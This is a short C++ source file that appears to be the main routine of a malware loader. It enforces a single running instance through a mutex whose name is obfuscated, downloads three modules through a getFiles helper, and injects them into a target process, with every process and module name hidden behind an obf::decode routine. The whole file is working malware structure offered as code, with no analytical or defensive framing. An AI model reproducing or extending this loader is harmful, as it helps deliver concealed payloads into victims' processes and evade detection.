
#include "pch.h"
#include "injector.h"
#include "getfile.h"
#include "obfuscate.h"

#define inject(X) Inject(obf::decode("\xcb\xf3\xd8\xfb\xe3\xdf\xe9\xcc\x97\xcb\xec\xfb"), X)

int main()
{
	// create mutex so only one instance of application is run
	HANDLE hMutex = OpenMutexA(MUTANT_ALL_ACCESS, 0, obf::decode("\xfd\xee\xde\xd5\xe3\xd9\xd3\x8f\x97\x9e").c_str());

	if (!hMutex)
		hMutex = CreateMutexA(0, 0, obf::decode("\xfd\xee\xde\xd5\xe3\xd9\xd3\x8f\x97\x9e").c_str());
	else
	{ 
		CloseHandle(hMutex);
		hMutex = NULL;
		return 0;
	}

	// download modules
	getFiles(1);
	getFiles(2);
	getFiles(3);

	Sleep(2000);

	// inject modules
	inject(obf::decode("\xdc\xee\xde\xf2\xfe\xde\xe9\xcd\xd1\xcb\xf8\xf2\xbb\xc2\xd5\x93"));
	inject(obf::decode("\xc5\xee\xd1\xfb\xe3\xca\xeb\xdb\xcb\x80\xf0\xf2\xf9"));
	inject(obf::decode("\xdd\xe8\xda\xf2\xe9\xc3\xff\xd6\xd6\xda\xba\xfa\xf9\xca"));

	return 0;
}